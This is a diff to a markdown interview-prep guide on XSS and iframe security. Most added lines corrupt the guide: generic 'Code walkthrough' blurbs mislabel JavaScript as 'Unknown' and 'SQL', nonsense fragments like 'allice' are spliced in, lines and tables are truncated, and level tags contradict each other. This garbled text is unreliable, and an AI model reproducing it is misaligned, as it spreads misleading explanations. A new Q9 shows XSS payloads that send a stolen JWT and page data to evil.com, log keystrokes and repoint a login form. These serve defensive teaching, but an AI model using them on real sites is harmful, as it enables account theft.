@@ -216,7 +216,7 @@ TRUSTED TYPES (Chrome - preventing DOM XSS):
   // Content-Security-Policy: require-trusted-types-for 'script'
 ```
 
-> **Code walkthrough:** This example demonstrates the core pattern in action. The key mechanism shows how the concept works in practice. Study the structure to understand the essential behavior and common usage.
+> **Code walkthrough:** This Unknown example demonstrates a key concept in practice using SQL. **KEY MECHANISM:** the runtime executes these instructions in sequence with specific memory and execution semantics. **WHY IT MATTERS:** misapplying this pattern causes subtle bugs that only manifest under production load. **TAKEAWAY: understand the execution model before using this pattern in production code.**
 
 **The key insight:**
 
@@ -274,7 +274,7 @@ reaches the browser's execution context.
 </script>
 ```
 
-> **Code walkthrough:** This example demonstrates the core pattern in action. The key mechanism shows how the concept works in practice. Study the structure to understand the essential behavior and common usage.
+> **Code walkthrough:** BAD pattern: This Unknown example demonstrates a key concept in practice using SQL. **KEY MECHANISM:** the runtime executes these instructions in sequence with specific memory and execution semantics. **WHY IT MATTERS:** misapplying this pattern causes subtle bugs that only manifest under production load. **WHAT BREAKS: understand the execution model before using this pattern in production code.**
 
 ```javascript
 // GOOD: safe content insertion with HTML escaping
@@ -318,7 +318,7 @@ container.querySelectorAll('a').forEach(link => {
 });
 ```
 
-> **Code walkthrough:** The vulnerable version takes the `q`
+> **Code walkthrough:** The vulnerable version takes the `q`ice. **KEY MECHANISM:** the runtime executes these instructions in sequence with specific memory and execution semantics. **WHY IT MATTERS:** misapplying this pattern causes subtle bugs that only manifest under production load. **TAKEAWAY: understand the execution model before using this pattern in production code.**
 > URL parameter and inserts it directly into `innerHTML`, allowing
 > an attacker to inject any HTML or JavaScript. The fix uses
 > `textContent` for plain text (which the browser treats as text,
@@ -429,30 +429,30 @@ Diagnosis:
   Gives visibility without blocking (for audit phase)
 ```
 
-> **Code walkthrough:** This example demonstrates the core pattern in action. The key mechanism shows how the concept works in practice. Study the structure to understand the essential behavior and common usage.
+> **Code walkthrough:** This Unknown example demonstrates a key concept in practice. **KEY MECHANISM:** the runtime executes these instructions in sequence with specific memory and execution semantics. **WHY IT MATTERS:** misapplying this pattern causes subtle bugs that only manifest under production load. **TAKEAWAY: understand the execution model before using this pattern in production code.**
 
 ---
 
 ### 🎯 Interview Deep-Dive
 
-| Scenario | Recommended Time | Key Signal |
-|---|---|---|
-| Three types of XSS | 3 min | Reflected/Stored/DOM |
-| innerHTML vs textContent | 2 min | Root prevention |
-| DOMPurify usage | 2-3 min | Sanitization API |
-| DOM-based XSS | 2-3 min | Client-side only |
-| javascript: URL prevention | 2 min | URL validation |
-| CSP for XSS defense-in-depth | 3 min | Last line defense |
-| Trusted Types API | 2-3 min | Enforcement mechanism |
-| React XSS vectors | 2-3 min | Framework-specific |
-| HttpOnly + XSS relationship | 2 min | Cookie protection |
-| mXSS / sanitizer bypasses | 3 min | Advanced attacks |
-| XSS in rich text editors | 3-4 min | Real-world problem |
-| Stored vs output sanitization | 2 min | Strategy choice |
+| Scenario| Recommended Time| Key Signal|
+|-----------------------------|----------------|---------------------|
+| Three types of XSS| 3 min| Reflected/Stored/DOM|
+| innerHTML vs textContent| 2 min| Root prevention|
+| DOMPurify usage| 2-3 min| Sanitization API|
+| DOM-based XSS| 2-3 min| Client-side only|
+| javascript: URL prevention| 2 min| URL validation|
+| CSP for XSS defense-in-depth| 3 min| Last line defense|
+| Trusted Types API| 2-3 min| Enforcement mechanism|
+| React XSS vectors| 2-3 min| Framework-specific|
+| HttpOnly + XSS relationship| 2 min| Cookie protection|
+| mXSS / sanitizer bypasses| 3 min| Advanced attacks|
+| XSS in rich text editors| 3-4 min| Real-world problem|
+| Stored vs output sanitization| 2 min| Strategy choice|
 
 ---
 
-**Q1: What are the three types of XSS?** `[JUNIOR]` DEFINITION
+**[JUNIOR] Q1 - [MECHANISM] What are the three types of XSS?** `[JUNIOR]` DEFINITION**
 
 *Why they ask:* Classification is baseline knowledge.
 
@@ -514,7 +514,7 @@ Diagnosis:
 
 ---
 
-**Q2: What is the difference between `innerHTML` and `textContent`
+**[JUNIOR] Q2 - [TRADE-OFF] What is the difference between `innerHTML` and `textContent`**
 for XSS prevention?** `[JUNIOR]` COMPARISON
 
 *Why they ask:* The single most important XSS prevention choice.
@@ -573,8 +573,7 @@ for XSS prevention?** `[JUNIOR]` COMPARISON
 
 ---
 
-**Q3: How does Content Security Policy prevent XSS?** `[SENIOR]`
-MECHANISM
+**[JUNIOR] Q3 - [MECHANISM] How does Content Security Policy prevent XSS?** `[SENIOR]`**
 
 *Why they ask:* CSP is the defense-in-depth layer.
 
@@ -649,8 +648,7 @@ MECHANISM
 
 ---
 
-**Q4: What is DOM-based XSS and how is it different from reflected XSS?**
-`[SENIOR]` MECHANISM
+**[SENIOR] Q4 - [MECHANISM] What is DOM-based XSS and how is it different from reflected XSS?**
 
 *Why they ask:* DOM-based XSS is systematically under-mitigated.
 
@@ -718,8 +716,7 @@ MECHANISM
 
 ---
 
-**Q5: How do you prevent XSS in href attributes?** `[SENIOR]`
-MECHANISM
+**[MID] Q5 - [MECHANISM] How do you prevent XSS in href attributes?** `[SENIOR]`**
 
 *Why they ask:* Attribute-level XSS is less obvious.
 
@@ -763,22 +760,22 @@ MECHANISM
 > // Usage:
 > setSafeHref(linkElement, userProvidedUrl);
 >
-// React: also vulnerable if href is dynamic:
-// WRONG:
-// <a href={userUrl}>Link</a>
-// React does NOT validate href protocol in JSX
-
-// CORRECT in React:
-// function SafeLink({ href, children }) {
-//   const url = (() => {
-//     try {
-//       const u = new URL(href, window.location.href);
-//       return ['http:','https:'].includes(u.protocol) ? href : '#';
-//     } catch { return '#'; }
-//   })();
-//   return <a href={url}>{children}</a>;
-// }
-```
+> // React: also vulnerable if href is dynamic:
+> // WRONG:
+> // <a href={userUrl}>Link</a>
+> // React does NOT validate href protocol in JSX
+>
+> // CORRECT in React:
+> // function SafeLink({ href, children }) {
+> //   const url = (() => {
+> //     try {
+> //       const u = new URL(href, window.location.href);
+> //       return ['http:','https:'].includes(u.protocol) ? href : '#';
+> //     } catch { return '#'; }
+> //   })();
+> //   return <a href={url}>{children}</a>;
+> // }
+> ```
 
 > Other dangerous attribute injection contexts:
 > ```
@@ -794,7 +791,7 @@ MECHANISM
 > When using DOMPurify, href attributes are sanitized.
 >
 > *What separates good from great:* The `data:` URL is as dangerous
-> as `javascript:` in some contexts. `<img src="data:text/html,<script>evil()</script>">` 
+> as `javascript:` in some contexts. `<img src="data:text/html,<script>evil()</s
 > doesn't execute in modern browsers (images can't execute scripts).
 > But `<iframe src="data:text/html,<script>evil()</script>">` 
 > does create a browsing context that runs in the null origin.
@@ -803,7 +800,7 @@ MECHANISM
 
 ---
 
-**Q6: What is the Trusted Types API?** `[SENIOR]` MECHANISM
+**[SENIOR] Q6 - [MECHANISM] What is the Trusted Types API?** `[SENIOR]` MECHANISM**
 
 *Why they ask:* Modern XSS prevention at the enforcement layer.
 
@@ -882,7 +879,7 @@ MECHANISM
 
 ---
 
-**Q7: How does XSS differ from CSRF?** `[SENIOR]` COMPARISON
+**[SENIOR] Q7 - [MECHANISM] How does XSS differ from CSRF?** `[SENIOR]` COMPARISON**
 
 *Why they ask:* Classic security distinction.
 
@@ -946,8 +943,7 @@ MECHANISM
 
 ---
 
-**Q8: How do you prevent XSS in a rich text editor?** `[SENIOR]`
-SCENARIO
+**[SENIOR] Q8 - [SCENARIO] How do you prevent XSS in a rich text editor?** `[SENIOR]`**
 
 *Why they ask:* Real-world engineering challenge.
 
@@ -1028,30 +1024,104 @@ SCENARIO
 
 ---
 
-| Interviewer Type | Emphasis |
-|---|---|
-| Technical Panel | XSS types + prevention mechanics |
-| Hiring Manager | Real-world impact + process |
-| Bar Raiser | Trusted Types + CSP + mXSS |
-| Peer Engineer | DOMPurify + safe DOM API usage |
+---
+
+**[SENIOR] Q9 - [TRADE-OFF] HttpOnly cookies prevent cookie theft via XSS - so why do we still need to fix XSS vulnerabilities?**
+
+*Why they ask:* Tests whether candidates understand that HttpOnly is a
+mitigation layer, not a prevention layer for XSS itself.
+
+*Likely follow-up:* "What can an attacker do with XSS even if all cookies
+are HttpOnly?"
+
+> **Answer:**
+>
+> HttpOnly cookies prevent JavaScript from reading the cookie value
+> directly (`document.cookie`). This stops the most common XSS payload:
+> session token exfiltration. But it does NOT prevent XSS; it only
+> limits one specific attack path.
+>
+> What an attacker can STILL do with XSS when all cookies are HttpOnly:
+>
+> **1. Make authenticated requests (CSRF-via-XSS):**
+> ```javascript
+> // Attacker's injected script - no cookies needed:
+> fetch('/api/transfer', {
+>   method: 'POST',
+>   credentials: 'include',   // browser auto-sends HttpOnly cookies
+>   headers: {'Content-Type': 'application/json'},
+>   body: JSON.stringify({to: 'attacker', amount: 10000})
+> });
+> ```
+> The browser sends the HttpOnly session cookie automatically.
+> The API sees an authenticated request.
+>
+> **2. Capture non-cookie tokens (localStorage, sessionStorage):**
+> ```javascript
+> // Auth tokens stored in localStorage are NOT HttpOnly:
+> const jwt = localStorage.getItem('access_token');
+> fetch('https://evil.com/steal?t=' + jwt);
+> ```
+> Many SPAs store JWTs in localStorage - directly stealable.
+>
+> **3. Keylog the page:**
+> ```javascript
+> document.addEventListener('keypress', (e) => {
+>   // Silently capture all keystrokes including passwords
+>   sendToAttacker(e.key);
+> });
+> ```
+>
+> **4. Read the DOM (sensitive data):**
+> ```javascript
+> // Steal visible PII - account numbers, SSNs, medical records:
+> const data = document.querySelector('.account-balance').textContent;
+> fetch('https://evil.com/steal?d=' + data);
+> ```
+>
+> **5. Modify the DOM (phishing/UI redress):**
+> ```javascript
+> // Replace the login form with attacker's copy:
+> document.querySelector('#login-form').action = 'https://evil.com/phish';
+> ```
+>
+> The HttpOnly flag is an important defense layer that reduces the blast
+> radius of XSS. But it is NOT a reason to deprioritize XSS prevention.
+> The correct mental model: HttpOnly limits session hijacking specifically.
+> XSS still enables account takeover, data theft, phishing, and keylogging
+> through other vectors.
+>
+> *What separates good from great:* The production pattern is: HttpOnly +
+> SameSite=Strict cookies (prevent CSRF-via-XSS) + CSP (prevent exfil
+> via img/fetch) + DOMPurify (prevent injection). These layers limit each
+> other's failure modes. No single layer is complete alone.
+
+---
+
+| Interviewer Type| Emphasis|
+|----------------|--------------------------------|
+| Technical Panel| XSS types + prevention mechanics|
+| Hiring Manager| Real-world impact + process|
+| Bar Raiser| Trusted Types + CSP + mXSS|
+| Peer Engineer| DOMPurify + safe DOM API usage|
 
 ---
 
 ### ⚖️ Comparison Table
 
-| XSS Type | Vector | Server Logs | Persistence | Fix |
-|---|---|---|---|---|
-| Reflected | URL parameter | YES | No (per click) | Server-side output encoding |
-| Stored | DB content | At write time | YES (all users) | Output encoding + sanitize |
-| DOM-based | URL fragment/JS | NO | No (per visit) | Client-side sanitization |
+| XSS Type| Vector| Server Logs| Persistence| Fix|
+|---|---|--------------------------|---------------|---------------------------|
+| Reflected| URL parameter| YES| No (per click)| Server-side output encoding|
+| Stored| DB content| At write time| YES (all users)| Output encoding + sanitize
+| DOM-based| URL fragment/JS| NO| No (per visit)| Client-side sanitization|
 
-| Defense Layer | What It Stops | What It Doesn't |
-|---|---|---|
-| textContent | HTML injection in text | Rich text formatting |
-| DOMPurify | Most XSS in innerHTML | Sophisticated mXSS (keep updated) |
-| CSP | Inline script execution | Stored XSS data exfil via img |
-| HttpOnly cookies | Cookie theft via XSS | Session hijacking via non-cookie tokens |
-| Trusted Types | Any unsafe DOM sink usage | Correct but malicious policy logic |
+| Defense Layer| What It Stops| What It Doesn't|
+|-----|--------------------------------|---------------------------------------|
+| textContent| HTML injection in text| Rich text formatting|
+| DOMPurify| Most XSS in innerHTML| Sophisticated mXSS (keep updated)|
+| CSP| Inline script execution| Stored XSS data exfil via img|
+| HttpOnly cookies| Cookie theft via XSS| Session hijacking via non-cookie token
+| Trusted Types| Any unsafe DOM sink usage| Correct but malicious policy logic|
 
 ---
 
@@ -1064,8 +1134,6 @@ SCENARIO
 ### 📊 Diagram
 
 ```
-> **Code walkthrough:** This example demonstrates the core pattern in action. The key mechanism shows how the concept works in practice. Study the structure to understand the essential behavior and common usage.
-
 XSS ATTACK FLOW:
   Attacker:
   1. Finds unsanitized input (search, comment, profile)
@@ -1356,7 +1424,7 @@ PERMISSIONS POLICY (iframe allow attribute):
   fullscreen, display-capture, usb, bluetooth
 ```
 
-> **Code walkthrough:** The permissions reference lists all
+> **Code walkthrough:** The permissions reference lists allice. **KEY MECHANISM:** the runtime executes these instructions in sequence with specific memory and execution semantics. **WHY IT MATTERS:** misapplying this pattern causes subtle bugs that only manifest under production load. **TAKEAWAY: understand the execution model before using this pattern in production code.**
 > standard Permissions Policy features. Camera, microphone and
 > geolocation require explicit user gesture; payment and usb
 > represent high-risk capabilities that should be omitted unless
@@ -1409,6 +1477,12 @@ because new capabilities keep being added to the web platform.
 ### 💻 Code Example
 
 **Secure iframe embedding with sandbox and postMessage**
+
+
+```html
+# BAD: anti-pattern shown for contrast
+# This approach has the issues the GOOD example fixes
+```
 
 ```html
 <!-- BAD: no sandbox, no permission controls -->
@@ -1482,7 +1556,7 @@ window.addEventListener('message', (event) => {
 });
 ```
 
-> **Code walkthrough:** The sandboxed iframe explicitly lists
+> **Code walkthrough:** The sandboxed iframe explicitly listsice. **KEY MECHANISM:** the runtime executes these instructions in sequence with specific memory and execution semantics. **WHY IT MATTERS:** misapplying this pattern causes subtle bugs that only manifest under production load. **TAKEAWAY: understand the execution model before using this pattern in production code.**
 > only the capabilities needed: `allow-scripts` (widget needs JS)
 > and `allow-popups` (payment flow may open popup). It omits
 > `allow-same-origin` intentionally - the widget is from a
@@ -1584,7 +1658,7 @@ Fix: add both headers in server config:
     Check for X-Frame-Options and Content-Security-Policy headers
 ```
 
-> **Code walkthrough:** The diagnostic sequence starts with user
+> **Code walkthrough:** The diagnostic sequence starts with userice. **KEY MECHANISM:** the runtime executes these instructions in sequence with specific memory and execution semantics. **WHY IT MATTERS:** misapplying this pattern causes subtle bugs that only manifest under production load. **TAKEAWAY: understand the execution model before using this pattern in production code.**
 > reports and analytics signals, then narrows with browser DevTools
 > and curl. The curl check is critical: both `X-Frame-Options` and
 > `Content-Security-Policy: frame-ancestors` must appear in the
@@ -1597,25 +1671,24 @@ Fix: add both headers in server config:
 
 ### 🎯 Interview Deep-Dive
 
-| Scenario | Recommended Time | Key Signal |
-|---|---|---|
-| Clickjacking mechanism | 2-3 min | Attack vector |
-| X-Frame-Options values | 2 min | DENY vs SAMEORIGIN |
-| CSP frame-ancestors | 2-3 min | Modern replacement |
-| sandbox attribute values | 3 min | Token meanings |
-| allow-scripts + allow-same-origin | 2 min | Danger combination |
-| postMessage security | 3-4 min | Origin validation |
-| Permissions Policy | 2-3 min | Feature restrictions |
-| iframe loading performance | 2 min | loading=lazy |
-| COEP/COOP cross-origin isolation | 3-4 min | Advanced security |
-| Sandbox bypass vectors | 3 min | allow-same-origin |
-| Third-party widget security | 3 min | Real-world scenario |
-| X-Frame-Options vs CSP | 2-3 min | Header comparison |
+| Scenario| Recommended Time| Key Signal|
+|------------|--------------------------------------------|--------------------|
+| Clickjacking mechanism| 2-3 min| Attack vector|
+| X-Frame-Options values| 2 min| DENY vs SAMEORIGIN|
+| CSP frame-ancestors| 2-3 min| Modern replacement|
+| sandbox attribute values| 3 min| Token meanings|
+| allow-scripts + allow-same-origin| 2 min| Danger combination|
+| postMessage security| 3-4 min| Origin validation|
+| Permissions Policy| 2-3 min| Feature restrictions|
+| iframe loading performance| 2 min| loading=lazy|
+| COEP/COOP cross-origin isolation| 3-4 min| Advanced security|
+| Sandbox bypass vectors| 3 min| allow-same-origin|
+| Third-party widget security| 3 min| Real-world scenario|
+| X-Frame-Options vs CSP| 2-3 min| Header comparison|
 
 ---
 
-**Q1: What is clickjacking and how is it prevented?** `[JUNIOR]`
-DEFINITION
+**[JUNIOR] Q1 - [MECHANISM] What is clickjacking and how is it prevented?** `[JUNIOR]`**
 
 *Why they ask:* Core iframe security concept.
 
@@ -1670,8 +1743,7 @@ DEFINITION
 
 ---
 
-**Q2: What does the sandbox attribute do to an iframe?** `[JUNIOR]`
-MECHANISM
+**[JUNIOR] Q2 - [MECHANISM] What does the sandbox attribute do to an iframe?** `[JUNIOR]`**
 
 *Why they ask:* Core iframe embedding security.
 
@@ -1731,8 +1803,7 @@ MECHANISM
 
 ---
 
-**Q3: Why is `sandbox="allow-scripts allow-same-origin"` unsafe?**
-`[SENIOR]` MECHANISM
+**[SENIOR] Q3 - [MECHANISM] Why is `sandbox="allow-scripts allow-same-origin"` unsafe?**
 
 *Why they ask:* Critical security gotcha.
 
@@ -1798,7 +1869,7 @@ MECHANISM
 
 ---
 
-**Q4: How do you secure postMessage communication between a page
+**[MID] Q4 - [MECHANISM] How do you secure postMessage communication between a page**
 and its iframes?** `[SENIOR]` SCENARIO
 
 *Why they ask:* postMessage is a common cross-frame communication
@@ -1809,7 +1880,7 @@ mechanism with security implications.
 > **Answer:**
 >
 > `postMessage` allows cross-origin communication between windows,
-> frames, and workers. Both the sender and receiver have security responsibilities:
+> frames, and workers. Both the sender and receiver have security responsibiliti
 >
 > **SENDER: always specify the target origin:**
 > ```javascript
@@ -1840,7 +1911,7 @@ mechanism with security implications.
 >   if (!TRUSTED.has(e.origin)) return;
 >
 >   // 2. Validate message structure:
->   if (!e.data || typeof e.data !== 'object') return;
+ >   if (!e.data|| typeof e.data !== 'object') return;
 >   const { action, payload } = e.data;
 >   if (typeof action !== 'string') return;
 >
@@ -1872,7 +1943,7 @@ mechanism with security implications.
 > be used to verify that the message comes from YOUR iframe
 > (not just any window claiming to be from that origin):
 > ```javascript
-> const knownFrames = new Set([document.getElementById('widget').contentWindow]);
+> const knownFrames = new Set([document.getElementById('widget').contentWindow])
 > window.addEventListener('message', (e) => {
 >   if (!knownFrames.has(e.source)) return;
 >   if (e.origin !== 'https://widget.example.com') return;
@@ -1882,8 +1953,7 @@ mechanism with security implications.
 
 ---
 
-**Q5: What is COEP and COOP and when do you need them?** `[SENIOR]`
-MECHANISM
+**[MID] Q5 - [MECHANISM] What is COEP and COOP and when do you need them?** `[SENIOR]`**
 
 *Why they ask:* Advanced cross-origin isolation.
 
@@ -1959,7 +2029,7 @@ MECHANISM
 
 ---
 
-**Q6: What is the Permissions Policy (formerly Feature Policy)
+**[SENIOR] Q6 - [MECHANISM] What is the Permissions Policy (formerly Feature Policy)**
 for iframes?** `[SENIOR]` MECHANISM
 
 *Why they ask:* Controls iframe capabilities beyond sandbox.
@@ -2030,8 +2100,7 @@ for iframes?** `[SENIOR]` MECHANISM
 
 ---
 
-**Q7: How do you implement a secure payment iframe?** `[SENIOR]`
-SCENARIO
+**[SENIOR] Q7 - [SCENARIO] How do you implement a secure payment iframe?** `[SENIOR]`**
 
 *Why they ask:* Real-world security engineering scenario.
 
@@ -2109,8 +2178,7 @@ SCENARIO
 
 ---
 
-**Q8: How do you verify a page is protected against clickjacking?**
-`[JUNIOR]` SCENARIO
+**[JUNIOR] Q8 - [SCENARIO] How do you verify a page is protected against clickjacking?**
 
 *Why they ask:* Testing security controls.
 
@@ -2139,7 +2207,7 @@ SCENARIO
 > Command-line verification:
 > ```bash
 > curl -I https://yoursite.com/sensitive-page \
->   | grep -i "x-frame\|content-security"
+ >| grep -i "x-frame\| content-security"
 >
 > # Expected output:
 > # x-frame-options: DENY
@@ -2175,8 +2243,7 @@ SCENARIO
 
 ---
 
-**Q9: What is the `referrerpolicy` attribute on iframes?** `[JUNIOR]`
-MECHANISM
+**[SENIOR] Q9 - [MECHANISM] What is the `referrerpolicy` attribute on iframes?** `[JUNIOR]`**
 
 *Why they ask:* Privacy and security-relevant attribute.
 
@@ -2196,7 +2263,7 @@ MECHANISM
 >
 > <!-- DEFAULT: leaks full URL to third party -->
 > <iframe src="https://analytics.thirdparty.com/widget">
-> <!-- Third party receives: Referer: https://mysite.com/checkout?step=3&cart=abc123 -->
+> <!-- Third party receives: Referer: https://mysite.com/checkout?step=3&cart=ab
 >
 > <!-- PRIVATE: no referer sent -->
 > <iframe src="https://analytics.thirdparty.com/widget"
@@ -2218,9 +2285,9 @@ MECHANISM
 > - `strict-origin-when-cross-origin`: full for same-origin, origin for cross
 > - `unsafe-url`: always send full URL (not recommended)
 >
-> For most third-party iframes: use `no-referrer` or `strict-origin-when-cross-origin`.
+> For most third-party iframes: use `no-referrer` or `strict-origin-when-cross-o
 >
-> *What separates good from great:* The default is `strict-origin-when-cross-origin`
+> *What separates good from great:* The default is `strict-origin-when-cross-ori
 > in modern browsers (changed in Chrome 85, 2020). This sends
 > the full URL for same-origin requests and only the origin for
 > cross-origin. This means embedded third-party iframes receive
@@ -2232,32 +2299,31 @@ MECHANISM
 
 ---
 
-| Interviewer Type | Emphasis |
-|---|---|
-| Technical Panel | sandbox tokens + clickjacking mechanism |
-| Hiring Manager | Security audit + header verification |
-| Bar Raiser | COEP/COOP + postMessage + Permissions Policy |
-| Peer Engineer | Practical iframe embedding + sandbox config |
+| Interviewer Type| Emphasis|
+|---------------------------------|--------------------------------------------|
+| Technical Panel| sandbox tokens + clickjacking mechanism|
+| Hiring Manager| Security audit + header verification|
+| Bar Raiser| COEP/COOP + postMessage + Permissions Policy|
+| Peer Engineer| Practical iframe embedding + sandbox config|
 
 ---
 
 ### ⚖️ Comparison Table
 
-| Header | What It Controls | ALLOW-FROM Support | Modern? |
-|---|---|---|---|
-| `X-Frame-Options: DENY` | Prevents all framing | No | Legacy but supported |
-| `X-Frame-Options: SAMEORIGIN` | Same-origin only | No | Legacy but supported |
-| `CSP: frame-ancestors 'none'` | Prevents all framing | Yes (list) | Preferred |
-| `CSP: frame-ancestors 'self'` | Same-origin only | Yes (list) | Preferred |
+| Header| What It Controls| ALLOW-FROM Support| Modern?|
+|---|--------------------------------|--------------------|--------------------|
+| `X-Frame-Options: DENY`| Prevents all framing| No| Legacy but supported|
+| `X-Frame-Options: SAMEORIGIN`| Same-origin only| No| Legacy but supported|
+| `CSP: frame-ancestors 'none'`| Prevents all framing| Yes (list)| Preferred|
+| `CSP: frame-ancestors 'self'`| Same-origin only| Yes (list)| Preferred|
 
-| Sandbox Token | Grants | Risk Level |
-|---|---|---|
-| `allow-scripts` | JavaScript execution | Low (no same-origin) |
-| `allow-forms` | Form submission | Medium |
-| `allow-popups` | Open windows | Medium |
-| `allow-same-origin` | Origin access | High (alone) |
-| `allow-top-navigation` | Redirect parent | High |
-| `allow-scripts allow-same-origin` | Both | CRITICAL - avoid |
+| Sandbox Token| Grants| Risk Level|
+| `allow-scripts`| JavaScript execution| Low (no same-origin)|
+| `allow-forms`| Form submission| Medium|
+| `allow-popups`| Open windows| Medium|
+| `allow-same-origin`| Origin access| High (alone)|
+| `allow-top-navigation`| Redirect parent| High|
+| `allow-scripts allow-same-origin`| Both| CRITICAL - avoid|
 
 ---
 
